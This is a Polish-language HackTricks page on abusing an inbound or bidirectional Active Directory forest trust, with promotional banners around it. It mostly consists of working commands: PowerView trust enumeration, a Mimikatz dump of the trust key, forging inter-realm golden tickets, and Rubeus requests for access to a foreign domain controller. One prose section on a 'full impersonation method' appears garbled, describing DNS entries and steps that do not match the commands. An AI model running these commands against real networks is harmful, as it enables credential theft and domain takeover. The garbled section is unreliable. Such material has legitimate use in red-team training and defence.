# Zewnętrzna domena leśna - jednokierunkowa (wchodząca) lub dwukierunkowa

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

W tym scenariuszu zewnętrzna domena ufa Tobie (lub obie domeny ufają sobie nawzajem), dzięki czemu możesz uzyskać pewien rodzaj dostępu do niej.

## Wyliczanie

Przede wszystkim musisz **wyliczyć** **zaufanie**:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
W poprzednim etapie wykryto, że użytkownik **`crossuser`** znajduje się w grupie **`External Admins`**, która ma **uprawnienia administratora** w **DC zewnętrznej domeny**.

## Początkowy dostęp

Jeśli nie udało się znaleźć żadnego **specjalnego** dostępu twojego użytkownika w innej domenie, możesz wrócić do Metodologii AD i spróbować **privesc z nieuprzywilejowanego użytkownika** (na przykład kerberoasting):

Możesz użyć funkcji **Powerview** do **wyliczenia** **innej domeny** przy użyciu parametru `-Domain`, na przykład:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Impersonacja

### Logowanie

Korzystając z regularnej metody i poświadczeń użytkowników, którzy mają dostęp do zewnętrznej domeny, powinieneś móc uzyskać dostęp do:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Wykorzystanie historii SID

Można również wykorzystać [**historię SID**](sid-history-injection.md) w przypadku zaufania między lasami.

Jeśli użytkownik zostanie przeniesiony **z jednego lasu do drugiego** i **nie jest włączone filtrowanie SID**, staje się możliwe **dodanie SID z innego lasu**, a ten **SID** zostanie **dodany** do **tokena użytkownika** podczas uwierzytelniania **przez zaufanie**.

{% hint style="warning" %}
Przypominamy, że można uzyskać klucz podpisu za pomocą
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

Możesz **podpisać** za pomocą **zaufanego** klucza **TGT podającego się za** użytkownika bieżącej domeny.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Pełna metoda podszywania się pod użytkownika

To jest pełna metoda, która pozwala na podszywanie się pod użytkownika w celu uzyskania dostępu do zasobów wewnętrznej domeny Active Directory. Ta technika jest przydatna, gdy chcemy uzyskać dostęp do zasobów w innej domenie leżącej na zewnątrz naszej domeny.

#### Krok 1: Uzyskanie dostępu do konta użytkownika

Najpierw musimy zdobyć dostęp do konta użytkownika w naszej wewnętrznej domenie Active Directory. Możemy to zrobić poprzez wykorzystanie różnych technik, takich jak phishing, ataki słownikowe lub wykorzystanie podatności w aplikacjach.

#### Krok 2: Utworzenie jednokierunkowego połączenia przychodzącego

Następnie musimy utworzyć jednokierunkowe połączenie przychodzące z naszej wewnętrznej domeny do zewnętrznej domeny, w której znajdują się zasoby, do których chcemy uzyskać dostęp. Możemy to zrobić, dodając odpowiednie wpisy DNS w naszej wewnętrznej domenie, które kierują ruch do zewnętrznej domeny.

#### Krok 3: Konfiguracja impersonacji użytkownika

Teraz musimy skonfigurować impersonację użytkownika w naszej wewnętrznej domenie. Możemy to zrobić, tworząc odpowiednie wpisy w Active Directory, które umożliwią nam podszywanie się pod użytkownika.

#### Krok 4: Uzyskanie dostępu do zasobów

Po skonfigurowaniu impersonacji użytkownika możemy uzyskać dostęp do zasobów w zewnętrznej domenie, korzystając z konta użytkownika w naszej wewnętrznej domenie. Możemy to zrobić, logując się na zasoby w zewnętrznej domenie przy użyciu danych uwierzytelniających konta użytkownika w naszej wewnętrznej domenie.

Ta metoda umożliwia nam uzyskanie dostępu do zasobów w zewnętrznej domenie, podając się za użytkownika w naszej wewnętrznej domenie. Jest to przydatne narzędzie w przypadku, gdy chcemy uzyskać dostęp do zasobów w innych domenach Active Directory.
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
